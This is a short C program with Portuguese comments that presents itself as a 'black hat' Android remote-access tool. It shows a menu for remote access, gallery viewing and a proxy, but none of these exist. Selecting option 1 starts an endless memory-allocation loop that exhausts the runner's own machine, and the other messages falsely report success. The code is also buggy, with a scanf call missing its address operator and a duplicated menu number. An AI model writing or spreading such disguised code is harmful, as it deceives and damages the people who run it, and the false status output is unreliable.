/* Devs Este Codigo é Apenas Uma Engenharia
 Para Utilização Black Hat
 Se For Utilizar o código deixa os creditos*/

// @ZeusXalocDev

#include <stdio.h>
#include <stdlib.h>  

void consumirMemoria(){
 double *ptr;
  while(1){
ptr = (double*)malloc(100);
  }
}

int main(){ 
    
 int menu;
 int clear;
 int proxy;
    printf("\n#############################################\n\n");
    printf("Criador: @ZeusXaloc-Dev\n");
    printf("Organização: @enormityhacking_org\n");
    printf("\n############################################\n\n");
    printf("{1} Acesso Remoto ao Android\n");
    printf("{2} Encerrar Sessão Remoto\n");
    printf("{3} Visualizar Galeria\n");
    printf("{4} Visualizar Janelas\n");
    printf("{5} Ligar Proxy\n");
    printf("{5} Clear");
    
    printf("\n\nDigite 1 Para Iniciar!\n");
    printf("\n\n•Digite o Número: ");
    scanf("%i", &menu);
    
    printf("\nProxy Foi Conectada Na Sua Rede");
    scanf("%i", &proxy);
    printf("\nLimpo com Sucesso!");
    scanf("%i", clear);
  
  if(menu == 1){
   consumirMemoria();
  }else{
   printf("\nSaindo do sistema...\n\n");
  }
return 0; 
}




































